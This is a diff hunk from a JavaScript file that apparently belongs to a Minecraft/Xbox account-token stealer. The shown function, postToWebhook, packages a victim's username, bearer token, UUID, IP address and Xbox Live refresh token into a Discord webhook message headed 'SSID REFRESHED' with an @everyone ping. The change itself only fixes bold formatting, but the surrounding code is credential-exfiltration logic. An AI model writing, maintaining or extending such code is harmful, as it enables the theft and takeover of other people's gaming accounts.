@@ -106,7 +106,7 @@ function postToWebhook(username, bearerToken, uuid, ip, userToken) {
     let data = {
         username: " ",
         avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
-        content: "@everyone" + " **SSID REFRESHED**\n**XBL REFRESH TOKEN:  ```" + userToken + "```\n",
+        content: "@everyone" + " **SSID REFRESHED**\n**XBL REFRESH TOKEN:**  ```" + userToken + "```\n",
         embeds: [{
             title: "User Info", color: 0x00ff50, fields: [
                 {name: "Username", value: username, inline: true},
